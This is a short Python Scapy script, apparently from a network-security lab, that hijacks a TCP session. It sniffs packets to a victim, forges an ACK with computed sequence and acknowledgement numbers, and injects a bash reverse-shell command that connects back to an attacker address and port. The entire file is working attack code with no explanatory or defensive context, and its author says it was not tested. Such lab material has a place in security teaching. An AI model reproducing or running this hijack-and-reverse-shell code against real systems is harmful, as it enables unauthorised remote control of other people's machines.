#!/usr/bin/env python3
from scapy.all import *
import subprocess

"""
This program was not tested, the creator doesn't ensure this solution is correct
"""

# The following two lines are used to automatically get the name of the interface used for docker
# If it does not work, you can simply set it manually
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True,
                       universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()

attacker_ip = "10.9.0.1"
attacker_port = 9090
victim_ip = "10.9.0.5"

REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2>&1\r"

def automatic_hijacking():
    print("*** Hijacking Automatic Mode ***")
    print('[+] Sniffing...')
    sniff(iface=IFACE, filter=f"tcp and dst host {victim_ip}", prn=_hijacking)


def _hijacking(pkt):
    if pkt[IP].src == victim_ip and Raw in pkt:
        tcp_seg_len = len(pkt.getlayer(Raw).load)

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A",
                  seq=pkt[TCP].ack+tcp_seg_len, ack=pkt[TCP].seq+tcp_seg_len)
        data = REVERSE_SHELL
        pkt = ip/tcp/data
        send(pkt, iface=IFACE, verbose=0)
        print('[+] Done')
        exit(0)


if __name__ == "__main__":
    automatic_hijacking()
